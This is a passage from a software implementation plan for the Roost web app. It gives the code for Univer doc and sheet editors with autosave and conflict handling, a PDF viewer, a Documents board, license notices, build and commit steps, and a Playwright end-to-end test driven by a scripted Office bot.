// SPDX-License-Identifier: Apache-2.0
// Adapted from @univerjs/presets 0.24.0 lib/es/index.js (createUniver), Copyright 2023-present DreamNum Co., Ltd.,
// licensed under the Apache License, Version 2.0, for Roost. Roost installs the individual open-source presets and
// never that meta package (it pulls in @univerjs-pro/*, spec §3.1), so this small wrapper replaces its createUniver.
import { LogLevel, Univer, type IUniverConfig, type LocaleType, type Plugin, type PluginCtor } from "@univerjs/core";
import { FUniver } from "@univerjs/core/facade";
import { defaultTheme } from "@univerjs/themes";

type PluginEntry = PluginCtor<Plugin> | readonly [PluginCtor<Plugin>, unknown];

export interface UniverPreset {
  plugins: readonly PluginEntry[];
}

export interface CreatedUniver {
  univer: Univer;
  univerAPI: FUniver;
}

export function createUniver(
  locale: LocaleType,
  locales: NonNullable<IUniverConfig["locales"]>,
  presets: readonly UniverPreset[],
): CreatedUniver {
  const univer = new Univer({ logLevel: LogLevel.WARN, theme: defaultTheme, locale, locales });
  for (const preset of presets) {
    for (const entry of preset.plugins) {
      const [plugin, config] = Array.isArray(entry) ? entry : [entry, undefined];
      univer.registerPlugin(plugin, config as ConstructorParameters<typeof plugin>[0]);
    }
  }
  return { univer, univerAPI: FUniver.newAPI(univer) };
}
```

`web/src/components/documents/univer/docKit.ts`:

```ts
// SPDX-License-Identifier: MIT
// Adapted from LazyClaw web/src/pages/Docs.tsx @ 21e1002 (Univer docs mount, createUniverDoc, CommandExecuted autosave), for Roost
import { LocaleType, mergeLocales } from "@univerjs/core";
import type { FUniver } from "@univerjs/core/facade";
import { UniverDocsCorePreset } from "@univerjs/preset-docs-core";
import DocsCoreEnUS from "@univerjs/preset-docs-core/locales/en-US";
import "@univerjs/preset-docs-core/lib/index.css";
import { createUniver } from "./createUniver";
import type { UniverKit } from "./kit";

type DocData = Parameters<FUniver["createUniverDoc"]>[0];

export const docKit: UniverKit = {
  mount(container, payload, onChange) {
    const { univer, univerAPI } = createUniver(LocaleType.EN_US, { [LocaleType.EN_US]: mergeLocales(DocsCoreEnUS) },
      [UniverDocsCorePreset({ container })]);
    univerAPI.createUniverDoc(payload as unknown as DocData);
    // The docs facade has no DocChanged event: CommandExecuted fires on every edit (LazyClaw's note).
    const listener = univerAPI.addEvent(univerAPI.Event.CommandExecuted, onChange);
    return {
      snapshot: () => (univerAPI.getActiveDocument()?.getSnapshot() as unknown as Record<string, unknown> | undefined) ?? null,
      dispose: () => { listener.dispose(); univer.dispose(); },
    };
  },
};
```

`web/src/components/documents/univer/sheetKit.ts`:

```ts
// SPDX-License-Identifier: MIT
// Adapted from LazyClaw web/src/pages/Sheets.tsx @ 21e1002 (Univer sheets mount, createWorkbook, SheetValueChanged /
// SheetSkeletonChanged autosave, wb.save()), for Roost
import { LocaleType, mergeLocales } from "@univerjs/core";
import type { FUniver } from "@univerjs/core/facade";
import { UniverSheetsCorePreset } from "@univerjs/preset-sheets-core";
import SheetsCoreEnUS from "@univerjs/preset-sheets-core/locales/en-US";
import "@univerjs/preset-sheets-core/lib/index.css";
import { createUniver } from "./createUniver";
import type { UniverKit } from "./kit";

type WorkbookData = Parameters<FUniver["createWorkbook"]>[0];

export const sheetKit: UniverKit = {
  mount(container, payload, onChange) {
    const { univer, univerAPI } = createUniver(LocaleType.EN_US, { [LocaleType.EN_US]: mergeLocales(SheetsCoreEnUS) },
      [UniverSheetsCorePreset({ container })]);
    univerAPI.createWorkbook(payload as unknown as WorkbookData);
    // Cell edits fire SheetValueChanged; resizing, inserting and deleting rows fire SheetSkeletonChanged.
    const listeners = [
      univerAPI.addEvent(univerAPI.Event.SheetValueChanged, onChange),
      univerAPI.addEvent(univerAPI.Event.SheetSkeletonChanged, onChange),
    ];
    return {
      snapshot: () => (univerAPI.getActiveWorkbook()?.save() as unknown as Record<string, unknown> | undefined) ?? null,
      dispose: () => { listeners.forEach((listener) => listener.dispose()); univer.dispose(); },
    };
  },
};
```

If `tsc -b` reports that `FUniver` lacks `createUniverDoc` / `createWorkbook` / the `Sheet*` events, the presets' facade augmentations aren't in scope. Add `import "@univerjs/preset-docs-core/lib/types/index";` or `import "@univerjs/preset-sheets-core/lib/types/index";` respectively, whichever path the package's `exports` resolves. Never install `@univerjs/presets` to fix types. If a type still doesn't line up, adjust only the type assertion (never `any`).

`web/src/components/documents/univer/useUniverAutosave.ts`:

```ts
import { useCallback, useEffect, useRef, useState, type RefObject } from "react";
import * as documentsApi from "../../../api/documents";
import { describeError } from "../../../api/client";
import { RevisionConflictError } from "../../../api/conflict";
import type { DocumentDetailOut } from "../../../api/types";
import type { UniverKit } from "./kit";

export const DOCUMENT_AUTOSAVE_MS = 800;
export type SaveState = "saved" | "saving" | "error";

export interface DocumentConflict {
  current: DocumentDetailOut;
  mine: Record<string, unknown>;
}

export interface UniverAutosave {
  state: SaveState;
  error: string | null;
  overwrite: (conflict: DocumentConflict) => Promise<void>;
  discardPending: () => void;
}

// One save against a known revision: the new revision on success, the stored
// copy handed to ``onConflict`` on a stale one, a plain message otherwise.
function usePersist(documentId: string, revision: { current: number },
  onConflict: (conflict: DocumentConflict) => void) {
  const [state, setState] = useState<SaveState>("saved");
  const [error, setError] = useState<string | null>(null);
  const persist = useCallback(async (payload: Record<string, unknown>, base: number) => {
    setState("saving");
    try {
      const saved = await documentsApi.saveDocument(documentId, { payload, base_revision: base });
      revision.current = saved.revision;
      setState("saved");
      setError(null);
    } catch (err) {
      if (err instanceof RevisionConflictError) {
        setState("saved");
        onConflict({ current: err.current as DocumentDetailOut, mine: payload });
        return;
      }
      setState("error");
      setError(describeError(err));
    }
  }, [documentId, revision, onConflict]);
  return { state, error, persist };
}

// Mounts ``doc`` with ``kit`` and saves the editor's snapshot a moment after
// the last edit — and when the editor goes away — always against the revision
// it last saw (LazyClaw's Docs/Sheets lifecycle). An unchanged snapshot is
// never sent. A stale revision goes to ``onConflict``; nothing is overwritten.
export function useUniverAutosave(
  kit: UniverKit, doc: DocumentDetailOut, containerRef: RefObject<HTMLDivElement | null>,
  onConflict: (conflict: DocumentConflict) => void,
): UniverAutosave {
  const revision = useRef(doc.revision);
  const discard = useRef(false);
  const { state, error, persist } = usePersist(doc.id, revision, onConflict);

  useEffect(() => {
    const container = containerRef.current;
    if (!container) return undefined;
    revision.current = doc.revision;
    discard.current = false;
    let lastJson = JSON.stringify(doc.payload ?? {});
    let timer: ReturnType<typeof setTimeout> | undefined;
    const flush = () => {
      const snapshot = editor.snapshot();
      if (!snapshot || JSON.stringify(snapshot) === lastJson) return;
      lastJson = JSON.stringify(snapshot);
      void persist(snapshot, revision.current);
    };
    const editor = kit.mount(container, doc.payload ?? {}, () => {
      clearTimeout(timer);
      timer = setTimeout(flush, DOCUMENT_AUTOSAVE_MS);
    });
    return () => {
      clearTimeout(timer);
      if (!discard.current) flush();
      editor.dispose();
    };
  }, [kit, doc, containerRef, persist]);

  const overwrite = useCallback((conflict: DocumentConflict) => persist(conflict.mine, conflict.current.revision),
    [persist]);
  const discardPending = useCallback(() => { discard.current = true; }, []);
  return { state, error, overwrite, discardPending };
}
```

`web/src/components/documents/univer/UniverEditor.tsx`:

```tsx
import { useCallback, useRef, useState } from "react";
import { ConflictNotice } from "../../board/ConflictNotice";
import type { DocumentDetailOut } from "../../../api/types";
import type { UniverKit } from "./kit";
import { useUniverAutosave, type DocumentConflict, type SaveState } from "./useUniverAutosave";

const SAVE_LABEL: Record<SaveState, string> = { saved: "Saved", saving: "Saving…", error: "Not saved" };

export interface UniverEditorProps {
  kit: UniverKit;
  document: DocumentDetailOut;
}

// A doc or a sheet in the Univer editor, saved as you go (M2 D4).
export function UniverEditor({ kit, document }: UniverEditorProps) {
  const containerRef = useRef<HTMLDivElement>(null);
  const [shown, setShown] = useState(document);
  const [conflict, setConflict] = useState<DocumentConflict | null>(null);
  const onConflict = useCallback((found: DocumentConflict) => setConflict(found), []);
  const save = useUniverAutosave(kit, shown, containerRef, onConflict);

  // Theirs replaces mine on screen; my unsaved edit is dropped, never saved.
  const loadLatest = () => {
    if (!conflict) return;
    save.discardPending();
    setShown(conflict.current);
    setConflict(null);
  };
  // Mine stays on screen and is saved over their revision.
  const keepMine = () => {
    if (!conflict) return;
    setConflict(null);
    void save.overwrite(conflict);
  };
  return (
    <div className="univer-shell">
      <p className="univer-shell__state" aria-live="polite">{SAVE_LABEL[save.state]}{save.error ? `: ${save.error}` : ""}</p>
      {conflict ? <ConflictNotice what="document" onLoad={loadLatest} onKeep={keepMine} /> : null}
      <div ref={containerRef} className="univer-editor" data-testid="univer-editor" />
    </div>
  );
}
```

`web/src/components/documents/univer/DocEditor.tsx` (and `SheetEditor.tsx`, the same with `sheetKit` and "sheets engine"):

```tsx
import { docKit } from "./docKit";
import { UniverEditor } from "./UniverEditor";
import type { DocumentDetailOut } from "../../../api/types";

// Its own lazy chunk (D4): the Univer docs engine loads only when a doc opens.
export default function DocEditor({ document }: { document: DocumentDetailOut }) {
  return <UniverEditor kit={docKit} document={document} />;
}
```

- [ ] **Step 7: The PDF viewer, the board, the tab**

`web/src/components/documents/PdfViewer.tsx`:

```tsx
// SPDX-License-Identifier: MIT
// Harvested from LazyClaw web/src/pages/Pdf.tsx lines 16-18, 21-27 @ 21e1002 (react-pdf + its pdf.js worker), adapted for Roost
import { useCallback, useState } from "react";
import { Document, Page, pdfjs } from "react-pdf";
import "react-pdf/dist/Page/AnnotationLayer.css";
import "react-pdf/dist/Page/TextLayer.css";

// pdf.js worker (react-pdf 10 + pdfjs-dist 5): resolved as a module URL so
// Vite emits it as an asset of this lazy chunk.
pdfjs.GlobalWorkerOptions.workerSrc = new URL("pdfjs-dist/build/pdf.worker.min.mjs", import.meta.url).toString();

const PAGE_WIDTH_PX = 760;

export interface PdfViewerProps {
  url: string;
  title: string;
}

// A PDF on the Board (M2 D4): one page at a time. Its own lazy chunk.
export default function PdfViewer({ url, title }: PdfViewerProps) {
  const [pages, setPages] = useState(0);
  const [page, setPage] = useState(1);
  const [error, setError] = useState<string | null>(null);
  const loaded = useCallback(({ numPages }: { numPages: number }) => setPages(numPages), []);
  const failed = useCallback(() => setError("This PDF could not be shown."), []);
  if (error) return <p className="board-empty">{error}</p>;
  return (
    <div className="pdf-viewer" aria-label={`PDF ${title}`}>
      <Document file={url} onLoadSuccess={loaded} onLoadError={failed} loading={<p className="board-loading">Loading&hellip;</p>}>
        <Page pageNumber={page} width={PAGE_WIDTH_PX} />
      </Document>
      {pages > 1 ? (
        <div className="pdf-viewer__nav">
          <button type="button" className="btn btn--quiet btn--small" aria-label="Previous page" disabled={page <= 1}
            onClick={() => setPage(page - 1)}>‹</button>
          <span>Page {page} of {pages}</span>
          <button type="button" className="btn btn--quiet btn--small" aria-label="Next page" disabled={page >= pages}
            onClick={() => setPage(page + 1)}>›</button>
        </div>
      ) : null}
    </div>
  );
}
```

`web/src/components/documents/KindIcon.tsx`:

```tsx
import type { DocumentKind } from "../../api/types";

const LABELS: Record<DocumentKind, string> = { doc: "Doc", sheet: "Sheet", pdf: "PDF" };

export function KindIcon({ kind }: { kind: DocumentKind }) {
  return (
    <svg className={`kind-icon kind-icon--${kind}`} role="img" aria-label={LABELS[kind]} viewBox="0 0 20 20" width={20} height={20}>
      <path d="M5 2h7l3 3v13H5z" fill="none" stroke="currentColor" strokeWidth={1.5} strokeLinejoin="round" />
      {kind === "doc" ? <path d="M8 9h5M8 12h5M8 15h3" stroke="currentColor" strokeWidth={1.5} strokeLinecap="round" /> : null}
      {kind === "sheet" ? <path d="M5 9h10M5 13h10M10 9v9" stroke="currentColor" strokeWidth={1.5} /> : null}
      {kind === "pdf" ? <path d="M7 14h6M8 10l2 2 2-2" stroke="currentColor" strokeWidth={1.5} fill="none" strokeLinecap="round" /> : null}
    </svg>
  );
}
```

`web/src/components/documents/DocumentRow.tsx`:

```tsx
import { useState } from "react";
import { KindIcon } from "./KindIcon";
import { WebContentChip } from "../board/WebContentChip";
import { relativeTimeAgo } from "../notes/noteHelpers";
import type { DocumentOut } from "../../api/types";

export interface DocumentRowProps {
  document: DocumentOut;
  onOpen: (documentId: string) => void;
  onKeep: (documentId: string) => void;
  onDelete: (documentId: string) => void;
}

export function DocumentRow({ document, onOpen, onKeep, onDelete }: DocumentRowProps) {
  const [confirming, setConfirming] = useState(false);
  return (
    <li className="doc-row">
      <KindIcon kind={document.kind} />
      <button type="button" className="doc-row__open" onClick={() => onOpen(document.id)}>{document.title}</button>
      <span className="doc-row__when">{relativeTimeAgo(document.updated_at)}</span>
      {document.tainted ? <WebContentChip what={document.title} onKeep={() => onKeep(document.id)} /> : null}
      {confirming ? (
        <span className="doc-row__confirm">
          <button type="button" className="btn btn--danger btn--small" aria-label={`Delete ${document.title} for good`}
            onClick={() => onDelete(document.id)}>Delete</button>
          <button type="button" className="btn btn--quiet btn--small" onClick={() => setConfirming(false)}>Cancel</button>
        </span>
      ) : (
        <button type="button" className="btn btn--quiet btn--small" aria-label={`Delete ${document.title}`}
          onClick={() => setConfirming(true)}>Delete</button>
      )}
    </li>
  );
}
```

`web/src/components/documents/DocumentOpen.tsx`:

```tsx
// SPDX-License-Identifier: MIT
// Adapted from LazyClaw web/src/pages/Documents.tsx lines 1-9 @ 21e1002 (one lazy chunk per kind), for Roost
import { lazy, Suspense } from "react";
import { pdfUrl } from "../../api/documents";
import type { DocumentDetailOut } from "../../api/types";

// Each kind is its own lazy chunk: opening a sheet doesn't pull in pdf.js, and
// opening a PDF doesn't pull in the Univer engine (D4).
const DocEditor = lazy(() => import("./univer/DocEditor"));
const SheetEditor = lazy(() => import("./univer/SheetEditor"));
const PdfViewer = lazy(() => import("./PdfViewer"));

export interface DocumentOpenProps {
  document: DocumentDetailOut;
  onBack: () => void;
}

function Editor({ document }: { document: DocumentDetailOut }) {
  if (document.kind === "doc") return <DocEditor document={document} />;
  if (document.kind === "sheet") return <SheetEditor document={document} />;
  return <PdfViewer url={pdfUrl(document.id)} title={document.title} />;
}

export function DocumentOpen({ document, onBack }: DocumentOpenProps) {
  return (
    <section className="doc-open" aria-label={document.title}>
      <div className="doc-open__bar">
        <button type="button" className="btn btn--quiet btn--small" onClick={onBack}>← Documents</button>
        <h3 className="doc-open__title">{document.title}</h3>
      </div>
      <Suspense fallback={<p className="board-loading">Opening&hellip;</p>}>
        <Editor document={document} />
      </Suspense>
    </section>
  );
}
```

`web/src/components/documents/DocumentsBoard.tsx`:

```tsx
import { useCallback, useEffect, useRef, useState } from "react";
import { ErrorNotice } from "../ErrorNotice";
import { DocumentOpen } from "./DocumentOpen";
import { DocumentRow } from "./DocumentRow";
import { useLiveState } from "../../hooks/useLiveStore";
import * as documentsApi from "../../api/documents";
import { describeError } from "../../api/client";
import type { DocumentDetailOut, DocumentOut } from "../../api/types";

type NewKind = "doc" | "sheet";
const NEW_TITLE: Record<NewKind, string> = { doc: "Untitled doc", sheet: "Untitled sheet" };

function DocumentsToolbar({ onNew, onUpload }: { onNew: (kind: NewKind) => void; onUpload: (file: File) => void }) {
  const fileRef = useRef<HTMLInputElement>(null);
  return (
    <div className="documents-toolbar">
      <button type="button" className="btn btn--primary" onClick={() => onNew("doc")}>New doc</button>
      <button type="button" className="btn btn--quiet" onClick={() => onNew("sheet")}>New sheet</button>
      <button type="button" className="btn btn--quiet" onClick={() => fileRef.current?.click()}>Upload PDF</button>
      <input ref={fileRef} type="file" accept="application/pdf" hidden aria-label="PDF file" onChange={(event) => {
        const file = event.target.files?.[0];
        event.target.value = "";
        if (file) onUpload(file);
      }} />
    </div>
  );
}

interface ListAreaProps {
  documents: DocumentOut[] | null;
  onOpen: (id: string) => void;
  onKeep: (id: string) => void;
  onDelete: (id: string) => void;
}

function DocumentsListArea({ documents, onOpen, onKeep, onDelete }: ListAreaProps) {
  if (documents === null) return <p className="board-loading">Loading&hellip;</p>;
  if (documents.length === 0) {
    return <p className="board-empty">No documents yet. Make one here, or ask a bot to “save … in a document”.</p>;
  }
  return (
    <ul className="doc-list" aria-label="Your documents">
      {documents.map((document) => (
        <DocumentRow key={document.id} document={document} onOpen={onOpen} onKeep={onKeep} onDelete={onDelete} />
      ))}
    </ul>
  );
}

function useDocumentActions(load: () => void, open: (id: string) => void, fail: (err: unknown) => void) {
  return {
    create: (kind: NewKind) => {
      documentsApi.createDocument({ kind, title: NEW_TITLE[kind] }).then((meta) => open(meta.id)).catch(fail);
    },
    upload: (file: File) => {
      documentsApi.uploadPdf(file).then((meta) => { load(); open(meta.id); }).catch(fail);
    },
    keep: (id: string) => { documentsApi.keepDocument(id).then(load).catch(fail); },
    remove: (id: string) => { documentsApi.deleteDocument(id).then(load).catch(fail); },
  };
}

// The user's documents, shared by every bot with the docs role (M2 D4). The
// list reloads on every documents_changed frame.
export default function DocumentsBoard() {
  const live = useLiveState();
  const [documents, setDocuments] = useState<DocumentOut[] | null>(null);
  const [open, setOpen] = useState<DocumentDetailOut | null>(null);
  const [error, setError] = useState<string | null>(null);
  const fail = useCallback((err: unknown) => setError(describeError(err)), []);
  const load = useCallback(() => {
    documentsApi.listDocuments().then((found) => { setDocuments(found); setError(null); }).catch(fail);
  }, [fail]);
  useEffect(() => load(), [load, live.boardVersion.documents]);
  const openDocument = useCallback((id: string) => { documentsApi.getDocument(id).then(setOpen).catch(fail); }, [fail]);
  const actions = useDocumentActions(load, openDocument, fail);

  if (open) return <DocumentOpen key={open.id} document={open} onBack={() => { setOpen(null); load(); }} />;
  return (
    <section className="documents-board" aria-label="Documents">
      <DocumentsToolbar onNew={actions.create} onUpload={actions.upload} />
      {error ? <ErrorNotice message={error} onRetry={load} /> : null}
      <DocumentsListArea documents={documents} onOpen={openDocument} onKeep={actions.keep} onDelete={actions.remove} />
    </section>
  );
}
```

`web/src/styles/documents.css` (import it in `web/src/styles.css` after `notes.css`):

```css
/* The Board's Documents tab (M2 D4): list with kind icons, Univer editors, PDF viewer. */
.documents-board { display: flex; flex-direction: column; gap: 16px; }
.documents-toolbar { display: flex; flex-wrap: wrap; gap: 8px; }
.doc-list { display: flex; flex-direction: column; gap: 8px; margin: 0; padding: 0; list-style: none; }
.doc-row {
  display: flex; flex-wrap: wrap; align-items: center; gap: 8px 12px; padding: 10px 14px;
  border: 1px solid var(--line); border-radius: var(--radius-md); background: var(--surface);
}
.doc-row__open {
  flex: 1 1 160px; min-width: 0; padding: 0; border: 0; background: none; color: var(--text);
  font: inherit; font-weight: 600; text-align: left; cursor: pointer; overflow-wrap: anywhere;
}
.doc-row__when { color: var(--faint); font-size: var(--fs-xs); }
.doc-row__confirm { display: inline-flex; gap: 6px; }
.kind-icon { flex: none; color: var(--emerald); }
.kind-icon--sheet { color: var(--slate); }
.kind-icon--pdf { color: var(--coral); }
.doc-open { display: flex; flex-direction: column; gap: 12px; }
.doc-open__bar { display: flex; align-items: center; gap: 12px; }
.doc-open__title { margin: 0; font: 600 var(--fs-lg) var(--font-display); overflow-wrap: anywhere; }
.univer-shell { display: flex; flex-direction: column; gap: 8px; }
.univer-shell__state { margin: 0; color: var(--muted); font-size: var(--fs-sm); }
.univer-editor {
  height: min(70vh, 720px); border: 1px solid var(--line); border-radius: var(--radius-md);
  overflow: hidden; background: var(--surface);
}
.pdf-viewer { display: flex; flex-direction: column; align-items: center; gap: 8px; overflow-x: auto; }
.pdf-viewer__nav { display: flex; align-items: center; gap: 12px; }
```

In `web/src/components/board/boardTabs.ts`, add `{ id: "documents", label: "Documents" }` after Notes. In `web/src/pages/Board.tsx`, add `const DocumentsBoard = lazy(() => import("../components/documents/DocumentsBoard"));` and `documents: lazyPanel(DocumentsBoard),` in `BOARD_PANELS`.

Append to `THIRD_PARTY_NOTICES.md`:

```markdown
## Adapted from Univer (Apache-2.0)

`web/src/components/documents/univer/createUniver.ts` adapts `createUniver` from `@univerjs/presets` 0.24.0
(`lib/es/index.js`), Copyright 2023-present DreamNum Co., Ltd., licensed under the Apache License, Version 2.0
(https://www.apache.org/licenses/LICENSE-2.0; the text ships in `web/node_modules/@univerjs/core/LICENSE`). Roost
installs the individual open-source presets instead of that meta package, which pulls in Univer's paid
`@univerjs-pro/*` line (spec §3.1); `web/tests/licenseGate.test.ts` fails on any `@univerjs-pro` package.

Depended on, not copied: `@univerjs/core`, `@univerjs/themes`, `@univerjs/preset-docs-core`,
`@univerjs/preset-sheets-core` and their `@univerjs/*` dependencies (Apache-2.0 — `@univerjs/telemetry`'s
package.json has no license field; its LICENSE file is Apache-2.0, a reviewed entry in `web/tests/licenseGate.ts`),
`pdfjs-dist` (Apache-2.0), `react-pdf`, `react-markdown` and `remark-gfm` (MIT); server side `pypdf` (BSD-3-Clause),
`pdfplumber` (MIT) and `reportlab` (BSD).
```

- [ ] **Step 8: Run the tests to see them pass; build; check the bundle**

```bash
cd /Users/blckit/Desktop/Code_Projects/roost/web && npm test && npm run build && npm run size
ls dist/assets | grep -c '\.js$'   # several chunks: the entry plus lazy Notes, Documents, doc/sheet editors, PDF viewer, pdf.js worker
```

Expected: PASS, and `npm run size` prints the entry within its budget. If the entry is over budget, a Univer, react-pdf or react-markdown import leaked into an eagerly loaded module. Find it with `grep -rn "univerjs\|react-pdf\|react-markdown" src --include=*.ts --include=*.tsx`: only `components/notes/NotePreview.tsx`, `components/documents/PdfViewer.tsx` and `components/documents/univer/*` may import them.

- [ ] **Step 9: Full gates and commit**

```bash
cd /Users/blckit/Desktop/Code_Projects/roost && uv run pytest --cov=roost --cov-fail-under=80 -q && (cd web && npm test && npm run build && npm run size)
git -C /Users/blckit/Desktop/Code_Projects/roost add web/package.json web/package-lock.json web/src/api/types.ts \
  web/src/api/documents.ts web/src/store/live.ts web/src/components/board/boardTabs.ts web/src/pages/Board.tsx \
  web/src/components/documents/DocumentsBoard.tsx web/src/components/documents/DocumentRow.tsx \
  web/src/components/documents/KindIcon.tsx web/src/components/documents/DocumentOpen.tsx \
  web/src/components/documents/PdfViewer.tsx web/src/components/documents/univer/kit.ts \
  web/src/components/documents/univer/createUniver.ts web/src/components/documents/univer/docKit.ts \
  web/src/components/documents/univer/sheetKit.ts web/src/components/documents/univer/useUniverAutosave.ts \
  web/src/components/documents/univer/UniverEditor.tsx web/src/components/documents/univer/DocEditor.tsx \
  web/src/components/documents/univer/SheetEditor.tsx web/src/styles/documents.css web/src/styles.css \
  web/tests/licenseGate.ts web/tests/licenseGate.test.ts web/tests/UniverEditor.test.tsx web/tests/PdfViewer.test.tsx \
  web/tests/DocumentsBoard.test.tsx web/tests/live.test.ts web/tests/Board.test.tsx THIRD_PARTY_NOTICES.md
git -C /Users/blckit/Desktop/Code_Projects/roost commit -m "feat: web Board Documents tab — Univer docs and sheets (open-source presets only), PDFs, license gate"
```

---

### Task 7: Playwright E2E for the Office bot, and the docs

Implements **D7**: an Office bot made from the preset, run against the per-bot stub model, does three things:
- "save all my tasks in a document" → a doc listing the tasks appears in Documents.
- "make a sheet of my October expenses" → a sheet appears.
- "note: Ana's birthday is 3 May, she likes orchids" → searching "orchids" shows the note in Notes.

The run also checks D6 (the new bot's thread shows in the sidebar). The E2E gateway moves to 5173 when the live gateway holds 18800 (the M1 approach, now in config). Then the docs.

**Files:**
- Create: `web/e2e/office.spec.ts`
- Modify: `web/e2e/fixtures/team-script.json` (add `"Office"`), `web/playwright.config.ts` (`ROOST_E2E_PORT`), `Makefile` (`e2e`), `CLAUDE.md`, `README.md`, `THIRD_PARTY_NOTICES.md`

**Interfaces:**
- Consumes: everything above; `signIn` and `createBotFromPreset` (`web/e2e/helpers.ts`); the scripted gateway (`ROOST_MODEL=scripted`, `ROOST_DESK=fake`, a temp data dir).
- Produces: the D7 end-to-end proof and docs that point at this plan.

- [ ] **Step 1: Path guard** (as Task 1 Step 1).

- [ ] **Step 2: Script the Office bot** — add to `web/e2e/fixtures/team-script.json`. Steps are consumed in order, and a tool step continues the same turn until a text step ends it:

```json
  "Office": [
    [{ "tool": "add_task", "args": { "title": "Buy orchids for Ana" } }],
    [{ "text": "Added: Buy orchids for Ana." }],
    [{ "tool": "list_tasks", "args": { "status": "all" } }],
    [{ "tool": "create_doc", "args": { "title": "My tasks", "markdown": "# My tasks\n\n- Buy orchids for Ana\n- Call the dentist" } }],
    [{ "text": "Saved your tasks in “My tasks”." }],
    [{ "tool": "log_expense", "args": { "amount": 12.5, "category": "food", "note": "lunch", "spent_at": "2026-10-03" } }],
    [{ "text": "Logged 12.50 EUR to food on 3 October." }],
    [{ "tool": "list_expenses", "args": { "month": "2026-10" } }],
    [{ "tool": "create_sheet", "args": { "title": "October expenses", "rows": [["Date", "Category", "Amount", "Note"], ["2026-10-03", "food", "12.50", "lunch"]] } }],
    [{ "text": "Made the sheet “October expenses”." }],
    [{ "tool": "add_note", "args": { "title": "Ana", "content": "Ana's birthday is 3 May. She likes orchids.", "tags": ["people"] } }],
    [{ "text": "Saved to [[Ana]]." }]
  ]
```

- [ ] **Step 3: A port for the E2E gateway that never collides with the live one**

In `web/playwright.config.ts`, add above `defineConfig`:

```ts
// M2 D7: while the live Roost gateway holds 18800, `make e2e` starts this
// throwaway, scripted gateway on 5173 instead (an allowed origin, roost/config.py).
const PORT = Number(process.env.ROOST_E2E_PORT ?? "18800");
```

Then use it: `baseURL: \`http://127.0.0.1:${PORT}\``, the `webServer.command`'s `--port ${PORT}` (make the command a template string), and `url: \`http://127.0.0.1:${PORT}/api/auth/me\``.

In `Makefile`, replace the last line of the `e2e` recipe (`cd web && npx playwright install chromium && npx playwright test`) with:

```make
	@port=18800; if curl -fsS -o /dev/null --max-time 2 http://127.0.0.1:18800/api/health; then port=5173; fi; \
	echo "E2E gateway on 127.0.0.1:$$port"; \
	cd web && npx playwright install chromium && npm run build && ROOST_E2E_PORT=$$port npx playwright test
```

- [ ] **Step 4: Write the spec** — `web/e2e/office.spec.ts`:

```ts
import { expect, test, type Page } from "@playwright/test";
import { createBotFromPreset, signIn } from "./helpers";

// M2 D7 against ROOST_MODEL=scripted + web/e2e/fixtures/team-script.json ("Office").
test.describe.configure({ mode: "serial" });

async function say(page: Page, text: string, reply: string): Promise<void> {
  const composer = page.getByPlaceholder("Message Office…");
  await composer.fill(text);
  await composer.press("Enter");
  await expect(page.getByText(reply)).toBeVisible();
}

// What read_document shows for a document, through the same session.
async function documentText(page: Page, title: string): Promise<string> {
  const listed = (await (await page.request.get("/api/documents")).json()) as { id: string; title: string }[];
  const found = listed.find((doc) => doc.title === title);
  expect(found, `a document titled ${title}`).toBeTruthy();
  const body = (await (await page.request.get(`/api/documents/${found?.id}/text`)).json()) as { text: string };
  return body.text;
}

test("an Office bot saves tasks in a doc, October expenses in a sheet, and a note it finds again", async ({ page }) => {
  await signIn(page);
  await createBotFromPreset(page, "Office");
  const roles = page.getByRole("list", { name: "Roles" });
  for (const role of ["Tasks", "Finance", "Notes", "Docs"]) await expect(roles).toContainText(role);
  // D6: the new bot's first thread shows in the sidebar straight away.
  await expect(page.getByRole("navigation", { name: "Team" }).getByRole("link", { name: "Untitled thread" })).toBeVisible();

  await say(page, "remind me to buy orchids for Ana", "Added: Buy orchids for Ana.");
  await say(page, "save all my tasks in a document", "Saved your tasks in “My tasks”.");
  await say(page, "spent 12.50 on lunch on 3 October, food", "Logged 12.50 EUR to food on 3 October.");
  await say(page, "make a sheet of my October expenses", "Made the sheet “October expenses”.");
  await say(page, "note: Ana's birthday is 3 May, she likes orchids", "Saved to [[Ana]].");

  await page.getByRole("link", { name: "Board" }).click();
  await page.getByRole("tab", { name: "Documents" }).click();
  const documents = page.getByRole("list", { name: "Your documents" });
  await expect(documents.getByRole("listitem").filter({ hasText: "My tasks" }).getByRole("img", { name: "Doc" })).toBeVisible();
  await expect(documents.getByRole("listitem").filter({ hasText: "October expenses" }).getByRole("img", { name: "Sheet" }))
    .toBeVisible();
  expect(await documentText(page, "My tasks")).toContain("Buy orchids for Ana");
  expect(await documentText(page, "October expenses")).toContain("lunch");

  await documents.getByRole("button", { name: "My tasks" }).click();
  await expect(page.getByTestId("univer-editor").locator("canvas").first()).toBeVisible();   // Univer really mounted
  await page.getByRole("button", { name: "← Documents" }).click();

  await page.getByRole("tab", { name: "Notes" }).click();
  const search = page.getByRole("searchbox", { name: "Search notes" });
  await search.fill("orchids");
  await search.press("Enter");
  const note = page.getByRole("list", { name: "Your notes" }).getByRole("listitem").filter({ hasText: "Ana" });
  await expect(note).toContainText("orchids");
});
```

- [ ] **Step 5: Run all E2E** (the target has its own disk guard and picks the port)

Run: `cd /Users/blckit/Desktop/Code_Projects/roost && make e2e`
Expected: every spec passes (`chief.spec.ts`, `life-admin.spec.ts`, `office.spec.ts`, `team.spec.ts`), and the run prints `E2E gateway on 127.0.0.1:5173` when the live gateway is up.
- If `make e2e` prints `BLOCKED: only …GB free`, stop and report it.
- If the canvas check fails, read the browser console in the trace (`npx playwright show-trace web/test-results/**/trace.zip`). A Univer plugin error there means `createUniver`/`docKit` needs fixing; never install `@univerjs/presets`.
- A `Refused to load the image` console line comes from the SPA's CSP (`img-src 'self' data: blob:`, Task 5). Find what asked for a remote image and draw it locally. Never loosen the policy.

- [ ] **Step 6: Docs**

`CLAUDE.md`:
- The Documentation Map gains: "`docs/plans/2026-10-14-roost-m2-notes-docs.md` — M2: the notes and docs roles (`roost/notes/`, `roost/documents/`, schema v9–v10), roles that work together, the Board's Notes and Documents tabs, the Univer license gate."
- Architecture gains one sentence: "Notes and documents are the **user's** too (`roost/notes/`, `roost/documents/`): one encrypted blob per document (AAD `docs:payload` / `sheets:payload` / `pdf:payload`), a `revision` compare-and-swap on every save (409 + the current copy), and the web editors are lazy chunks built from Univer's open-source presets only (`web/tests/licenseGate.test.ts`)."
- The Commands block gains `cd web && npm run size   # main-bundle budget (bundle-budget.json)`.

`README.md` — add after the Roles section:

```markdown
## Notes and documents

